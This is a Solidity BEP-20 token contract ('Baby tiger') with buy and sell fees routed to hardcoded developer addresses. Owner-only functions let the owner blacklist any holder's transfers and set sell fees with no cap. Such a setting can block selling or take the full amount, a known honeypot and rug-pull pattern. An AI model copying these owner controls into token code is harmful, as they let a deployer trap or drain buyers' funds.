/**
 *Submitted for verification at BscScan.com on 2022-01-01
*/

/**
 *Submitted for verification at BscScan.com on 2021-11-16
*/

// SPDX-License-Identifier: MIT
pragma solidity 0.8.1;
interface relationship {
    function defultFather() external returns(address);
    function father(address _addr) external returns(address);
    function grandFather(address _addr) external returns(address);
    function otherCallSetRelationship(address _son, address _father) external;
    function getFather(address _addr) external view returns(address);
    function getGrandFather(address _addr) external view returns(address);
}
interface Ipair{
    function getReserves() external view returns (uint112 _reserve0, uint112 _reserve1, uint32 _blockTimestampLast);
    function token0() external view returns (address);
    function token1() external view returns (address);
}
library SafeMath {
    /**
     * @dev Returns the addition of two unsigned integers, reverting on
     * overflow.
     *
     * Counterpart to Solidity's `+` operator.
     *
     * Requirements:
     *
     * - Addition cannot overflow.
     */
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    /**
     * @dev Returns the subtraction of two unsigned integers, reverting on
     * overflow (when the result is negative).
     *
     * Counterpart to Solidity's `-` operator.
     *
     * Requirements:
     *
     * - Subtraction cannot overflow.
     */
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    /**
     * @dev Returns the subtraction of two unsigned integers, reverting with custom message on
     * overflow (when the result is negative).
     *
     * Counterpart to Solidity's `-` operator.
     *
     * Requirements:
     *
     * - Subtraction cannot overflow.
     */
    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }

    /**
     * @dev Returns the multiplication of two unsigned integers, reverting on
     * overflow.
     *
     * Counterpart to Solidity's `*` operator.
     *
     * Requirements:
     *
     * - Multiplication cannot overflow.
     */
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
        // benefit is lost if 'b' is also tested.
        // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    /**
     * @dev Returns the integer division of two unsigned integers. Reverts on
     * division by zero. The result is rounded towards zero.
     *
     * Counterpart to Solidity's `/` operator. Note: this function uses a
     * `revert` opcode (which leaves remaining gas untouched) while Solidity
     * uses an invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    /**
     * @dev Returns the integer division of two unsigned integers. Reverts with custom message on
     * division by zero. The result is rounded towards zero.
     *
     * Counterpart to Solidity's `/` operator. Note: this function uses a
     * `revert` opcode (which leaves remaining gas untouched) while Solidity
     * uses an invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        // assert(a == b * c + a % b); // There is no case in which this doesn't hold

        return c;
    }

    /**
     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
     * Reverts when dividing by zero.
     *
     * Counterpart to Solidity's `%` operator. This function uses a `revert`
     * opcode (which leaves remaining gas untouched) while Solidity uses an
     * invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }

    /**
     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
     * Reverts with custom message when dividing by zero.
     *
     * Counterpart to Solidity's `%` operator. This function uses a `revert`
     * opcode (which leaves remaining gas untouched) while Solidity uses an
     * invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}
contract Ownable {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor (address _addr) {
        _owner = _addr;
        emit OwnershipTransferred(address(0), _addr);
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view  returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(owner() == msg.sender, "Ownable: caller is not the owner");
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public  onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}
contract ERC20 {

    mapping (address => uint256) internal _balances;
    mapping (address => mapping (address => uint256)) private _allowances;

    mapping (address => bool) public fromWriteList;
    mapping (address => bool) public toWriteList;
    mapping (address => bool) public fiveWriteList;
    mapping (address => bool) public blackList;

    uint256 private _totalSupply;
    string private _name;
    string private _symbol;
    uint8 private _decimals;


    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    constructor() {
        _name = "Baby tiger";
        _symbol = "Baby tiger";
        _decimals = 18;
    }

    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public virtual returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view virtual returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public virtual returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public virtual returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
        return true;
    }

    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        _approve(msg.sender, spender, _allowances[msg.sender][spender] + addedValue);
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        _approve(msg.sender, spender, _allowances[msg.sender][spender] - subtractedValue);
        return true;
    }

    function _transfer(address sender, address recipient, uint256 amount) internal virtual {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(blackList[msg.sender] == false && blackList[sender] == false && blackList[recipient] == false, "ERC20: is black List !");

        uint256 trueAmount = _beforeTokenTransfer(sender, recipient, amount);


        _balances[sender] = _balances[sender] - amount;//修改了这个致命bug
        _balances[recipient] = _balances[recipient] + trueAmount;
        emit Transfer(sender, recipient, trueAmount);
    }

    function _mint(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");

        _totalSupply = _totalSupply + amount;
        _balances[account] = _balances[account] + amount;
        emit Transfer(address(0), account, amount);
    }

    function _approve(address owner, address spender, uint256 amount) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _beforeTokenTransfer(address from, address to, uint256 amount) internal virtual  returns (uint256) { }
}
contract Baby is ERC20, Ownable{
    using SafeMath for uint256;

    address public USDT = 0x55d398326f99059fF775485246999027B3197955;//0x6fc6F4262aF130141411f7fcE5Cc08d60C19Dc03
    uint256 constant _FIVE_MIN = 300;
    Ipair public pair_USDT;
    relationship public RP;

    mapping(address => bool) public isPair;

    uint256 public startTradeTime;
    uint256 public shareRate = 1;
    uint256 public devRate = 1;
    uint256 public buyRate = 14;
    uint256 public sellRate = 14;

    bool public  open= true;
    uint256 public rate1 = 3;
    uint256 public rate2 = 15;
    uint256 public rate3 = 4;

    address public devAddr=0x2c8239D1377C0c8f8C88961fb61E81FCB968e8EB;
    address public devAddr2=0x7f592f896864b5cEE2c91AaC2001b70F55564Ad7;
    address public devAddr3=0x796c1335f466F3C24DF26802F2ceDFb4f67d3759;
    address public devAddr4=0x3454b5f7851f59804dCcBBaB0fc856d58Def474D;
    address public devAddr5=0xd8A2b16Fc7f94f8606645FC219616CA991a77162;
    address public mintPoolAddr;


    constructor () Ownable(msg.sender){

        _mint(msg.sender, 760000000 * 10**18);
        fromWriteList[msg.sender] = true;
        toWriteList[msg.sender] = true;
    }

    function _beforeTokenTransfer(
        address _from,
        address _to,
        uint256 _amount
    )internal override returns (uint256){

        if (fromWriteList[_from] || toWriteList[_to]){
            return _amount;
        }

        uint256 _trueAmount;
        if (isPair[_from]){
            _trueAmount = _amount * (100 - (rate1 + rate1 + rate1 + rate1)) / 100;

            _balances[devAddr] = _balances[devAddr] + (_amount * rate1 / 100 );
            _balances[devAddr2] = _balances[devAddr2] + (_amount * rate1 / 100 );
            _balances[devAddr3] = _balances[devAddr3] + (_amount * rate1 / 100 );
            //_balances[devAddr4] = _balances[devAddr4] + (_amount * rate1 / 100 );
        } else if (isPair[_to]) {

            _trueAmount = _amount * (100 - rate2) / 100;
            _balances[devAddr5] = _balances[devAddr5] + (_amount * rate2 / 100);
        } else{
            return _amount;
        }
        return _trueAmount;
    }

    function sendReff(
        address _son,
        address _father
    ) internal {
        if(!isPair[_son] && !isPair[_father]){
            RP.otherCallSetRelationship(_son, _father);
        }
    }

    function getLpTotalRate() public view returns(uint256){


        uint256 amountA;
        uint256 amountB;
        if (pair_USDT.token0() == USDT){
            (amountA, amountB,) = pair_USDT.getReserves();
        }
        else{
            (amountB, amountA,) = pair_USDT.getReserves();
        }
        uint256 total = amountA.mul(2);
        uint256 rate = rate1;
        if(total>3000000000000000000000000 && total<=10000000000000000000000000){
            rate=rate2;
        }else if(total>10000000000000000000000000 && total<=30000000000000000000000000){
            rate=rate3;
        }

        return rate;
    }

    function getMaxHoldAMount() public view returns(uint256){
        uint256 price = getPrice();

        uint256 result;
        if(price <= 100){
            result = price / 10 + 1;
        }else{
            result = 2022;
        }

        return result * 10 **18;
    }

    function getPrice() internal view returns(uint256){

        uint256 amountA;
        uint256 amountB;
        if (pair_USDT.token0() == USDT){
            (amountA, amountB,) = pair_USDT.getReserves();
        }
        else{
            (amountB, amountA,) = pair_USDT.getReserves();
        }
        uint256 price = amountA /amountB;
        return price;
    }

    //admin func///////////////////////////////////////////////////////////////

    function setPair(
        address _addr,
        bool _isUSDT
    ) external onlyOwner{
        isPair[_addr] = true;
        if(_isUSDT && address(pair_USDT) == address(0)){
            pair_USDT = Ipair(_addr);
        }
    }

    function setUsdt(
        address _addr
    ) external onlyOwner{
        USDT = _addr;
    }


    function setWhiteList(
        address _addr,
        uint256 _type,
        bool _YorN
    ) external onlyOwner{

        if (_type == 0){
            fromWriteList[_addr] = _YorN;
        }else if (_type == 1){
            toWriteList[_addr] = _YorN;
        }else if (_type == 2){
            fiveWriteList[_addr] = _YorN;
        }
    }

    function setBlackList(
        address _addr,
        bool _YorN
    ) external onlyOwner{
        blackList[_addr] = _YorN;
    }

    function setRate(
        uint256 _shareRate,
        uint256 _devRate,
        uint256 _buyRate,
        uint256 _sellRate
    ) external onlyOwner{
        require(_shareRate <= 1,"invaild input");
        require(_devRate <= 1,"invaild input");
        require(_buyRate <= 14,"invaild input");
        require(_sellRate <= 14,"invaild input");

        shareRate = _shareRate;
        devRate = _devRate;
        buyRate = _buyRate;
        sellRate = _sellRate;
    }

    function setRate2(
        uint256 _rate1,
        uint256 _rate2,
        uint256 _rate3
    ) external onlyOwner{

        rate1 = _rate1;
        rate2 = _rate2;
        rate3 = _rate3;
    }

    function setOpen(
        bool _open
    ) external onlyOwner{
        open = _open;
    }


    function setAddr(
        address _devAddr,
        address _devAddr2,
        address _devAddr3,
        address _devAddr4,
        address _devAddr5
    ) external onlyOwner{
        devAddr = _devAddr;
        devAddr2 = _devAddr2;
        devAddr3 = _devAddr3;
        devAddr4 = _devAddr4;
        devAddr5 = _devAddr5;
    }

    function setRP(
        address _addr
    ) public onlyOwner{
        RP = relationship(_addr);
    }


    function testSetStartTime(
        uint256 _time
    ) external onlyOwner{
        startTradeTime = _time;
    }
}